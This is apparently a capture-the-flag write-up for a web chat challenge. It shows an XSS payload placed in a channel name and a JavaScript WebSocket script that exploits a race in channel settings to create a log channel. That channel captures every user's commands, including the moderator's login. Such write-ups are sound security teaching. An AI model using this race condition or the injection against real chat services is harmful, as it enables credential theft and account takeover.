  A chat server with some 'interesting' features! I wonder how many of them are secure...

  (Send /help to get started.)

First, we need to register:

There are 3 default channels. We can send messages:

`/help` reveals other useful commands. Notice that the website communicates with the server via WebSockets.

The target is to log in as a moderator. The moderator periodically announces the time:

There is also an XSS unrelated to the exploit path. The `onclick` handler for the channel list (which joins a channel
when clicked) can be exploited to run arbitrary JavaScript.

A channel like `');alert(1)//` triggers the exploit when clicked, as the HTML looks like this:

But, again, this is unrelated. 

We have some interesting commands: we can change the CSS of the username (which will be reflected for everyone in 
the chat), but it's not relevant. We also have the `/set` command which can set multiple properties:

`channel.mode` can either be `normal` (default) or `log`, which seems like an interesting attack path. However, setting
it to `log` requires setting the channel to `hidden` and `admin-only`. We are not admins, so if we set it to `admin-only`
we cannot access the channel anymore. Furthermore, setting it to `admin-only` forcibly closes our WebSocket connection.

However, WebSocket messages are sent asynchronously. What if we could make a channel `log`, then remove the `admin-only`
property immediately after, before the WebSocket connection is closed?

```js
const ws = new WebSocket("ws://challenge.utctf.live:5213/socket", {
    headers: {
        Cookie: "web-chat-userid=PMDqpEyuUTYr8jhP7W5kUsbuvKPALTw8lHvQwTAAAeN9BssRFSvqL0OftUCMzQY%3D"
    }
});
ws.addEventListener("open", open);
ws.addEventListener("message", message);

function message(message) {
    console.log(message.data);
}

function open() {
    const channelName = `channelABCDE`;
    ws.send(`/create ${channelName}`);
    ws.send(`/join ${channelName}`);
    ws.send("/set channel.hidden true");
    ws.send("/set channel.admin-only true");
    ws.send("/set channel.mode log");
    ws.send("/set channel.admin-only false");
}
```

The exploit worked: we get two messages that the `admin-only` property has been updated:

We can `/join` the channel in the UI. On `log` channels we receive any command run by any user, including the moderator's login!

![](9.png)

We just need to log in as the moderator, join `mod-info` and view the channel details with `/channel` to get the flag:
